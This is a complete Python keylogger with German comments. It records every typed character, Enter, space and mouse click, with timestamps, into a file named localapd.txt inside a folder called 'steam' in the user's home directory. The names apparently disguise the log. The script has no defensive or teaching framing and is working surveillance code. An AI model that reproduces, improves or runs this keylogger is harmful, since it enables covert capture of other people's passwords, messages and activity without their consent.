import os
from pynput import keyboard, mouse
from datetime import datetime

# Benutzerverzeichnis + steam Ordner
user_dir = os.path.expanduser("~")
steam_folder = os.path.join(user_dir, "steam")
os.makedirs(steam_folder, exist_ok=True)

# Pfad zur Log-Datei
log_path = os.path.join(steam_folder, "localapd.txt")

# 🖱 Maus-Klick Event
def on_click(x, y, button, pressed):
    if pressed:
        write_newline("[Mausklick]")

# ⌨ Tastendruck Event
def on_press(key):
    try:
        key_str = key.char
    except AttributeError:
        key_str = str(key).replace("Key.", "")
    
    # Sondertasten behandeln
    if key == keyboard.Key.space:
        write_newline("[space]")
    elif key == keyboard.Key.enter:
        write_newline("[enter]")
    elif isinstance(key, keyboard.Key):
        # Sondertasten wie Shift oder Ctrl nicht loggen
        return
    else:
        write(key_str)

def write(content):
    with open(log_path, "a", encoding="utf-8") as log_file:
        log_file.write(content)

def write_newline(label):
    timestamp = datetime.now().strftime("%d.%m.%Y / %H:%M")
    with open(log_path, "a", encoding="utf-8") as log_file:
        log_file.write(f"[{label}]     | {timestamp}\n")

# ESC beendet den Tast-Listener
def on_release(key):
    if key == keyboard.Key.esc:
        return False

# Starte Tastatur- und Maus-Listener gleichzeitig
keyboard_listener = keyboard.Listener(on_press=on_press, on_release=on_release)
mouse_listener = mouse.Listener(on_click=on_click)

keyboard_listener.start()
mouse_listener.start()

keyboard_listener.join()
mouse_listener.join()
